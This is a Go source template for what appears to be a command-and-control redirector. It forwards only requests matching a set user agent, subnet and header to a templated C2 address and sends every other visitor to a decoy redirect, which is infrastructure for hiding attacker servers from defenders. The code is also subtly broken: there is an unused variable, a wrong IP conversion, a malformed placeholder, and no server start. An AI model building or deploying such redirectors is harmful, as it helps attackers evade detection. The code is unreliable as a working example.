package main

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
)

type Prox struct {
	// target url of reverse proxy
	target *url.URL
	// instance of Go ReverseProxy thatwill do the job for us
	proxy *httputil.ReverseProxy
}

func invalidUA(userAgent string) bool {
	ua := "{{.RestrictedUA}}"
	if len(ua) != 0 && ua != userAgent {
		return true
	}
	return false
}

func invalidIP(remoteIP string) bool {
	subnet := "{{.RestrictedSubnet}}"
	if len(subnet) != 0 {
		ip, cidr, err := net.ParseCIDR(subnet)
		if err != nil {
			return false
		}
		if !cidr.Contains(net.IP([]byte(remoteIP))) {
			return true
		}
	}
	return false
}

func invalidHeader(remoteHeader http.Header) bool {
	header, value := "{{.RestrictedHeaderKey}}", "{{.RestrictedHeaderValue}}"
	if len(header) != 0 && len(value) != 0 {
		if remoteHeader.Get(header) != value {
			return true
		}
	}
	return false
}

// small factory
func New(target string) *Prox {
	url, _ := url.Parse(target)
	// you should handle error on parsing
	return &Prox{target: url, proxy: httputil.NewSingleHostReverseProxy(url)}
}

func (p *Prox) handle(w http.ResponseWriter, r *http.Request) {
	// call to magic method from ReverseProxy object
	fmt.Println("Request Received")
	if invalidUA(r.UserAgent()) || invalidIP(r.RemoteAddr) || invalidHeader(r.Header) {
		http.Redirect(w, r, "{.DefaultRedirect}", 301)
	} else {
		p.proxy.ServeHTTP(w, r)
	}
}

func main() {
	// proxy
	// proxy
	proxy := &Prox{}
	proxy = New("{{.C2Url}}")

	// server
	http.HandleFunc("/", proxy.handle)
}
